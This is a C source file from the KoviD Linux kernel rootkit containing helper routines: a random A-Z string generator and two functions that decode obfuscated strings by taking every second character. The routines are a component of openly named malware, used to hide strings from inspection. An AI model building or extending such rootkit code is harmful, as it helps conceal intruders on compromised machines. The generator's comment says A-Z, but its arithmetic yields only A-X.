/**
 * Linux Kernel version <= 5.8.0
 * - hash
 *
 *  KoviD rootkit
 */
#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,11,0)
#include <linux/sched/signal.h>
#else
#include <linux/sched.h>
#endif
#include <linux/tcp.h>
#include <linux/slab.h>
#include <linux/random.h>
#include "lkm.h"

/**
 * This function allocates dynamic memory
 * and must be freed when no longer needed
 */
char *kv_whatever_random_AZ_string(size_t size) {
    int i = 0;
    char *buf = NULL;
    if(!size) {
        prerr("Wrong size parameter!!\n");
        return NULL;
    }

    buf = kmalloc(size+1, GFP_KERNEL);
    if(!buf) {
        prerr("Could not allocate memory!\n");
        return NULL;
    }

    get_random_bytes(buf, size);
    for(i = 0; i < size; ++i) {
        int byte = (int)buf[i];
        if (byte < 0)
            byte = ~byte;
        /* ascii A-Z */
        buf[i] = byte % (90 - (65 + 1)) + 65;
    }
    buf[i] = 0;
    return buf;
}

/**
 * Convert obfuscated string into valid one
 * Returns static allocated char, not thread-safe
 * must be called from init only
 * limited to 512 bytes
 */
char *kv_whatever_getstr(const char *in, unsigned int len) {
    int i = 1, x = 0;
    static char s[512];
    unsigned long maxlen = (((len+1)/2) + (!(len%2)));

    if (!in)
        goto leave;

    if (maxlen >= sizeof(s))
        goto leave;

    memset(s, 0, sizeof(s));
    for (; i < len && x < sizeof(s); i+=2, x++)
        s[x] = in[i];
    s[x] = 0;

leave:
    return s;
}

/*
 * same as kv_whatever_getstr but on heap
 * must be freed when no longer needed
 */
char *kv_whatever_copystr(const char *in, unsigned long len) {
    int i = 1, x = 0;
    int siz;
    char *s = NULL;

    if (!in)
        goto leave;

    if (len <= 0)
        goto leave;

    /**
     * make sure it is rounded up
     * even though this should come
     * from sizeof(), but anyway...
     */
    siz = (len+1)/2;

    /** make room for null byte if necessary */
    s = kcalloc(1, siz+(!(len%2)), GFP_KERNEL);

    if (!s)
        goto leave;

    for (; i < len; i+=2, x++)
        s[x] = in[i];
    s[x] = 0;

leave:
    return s;
}
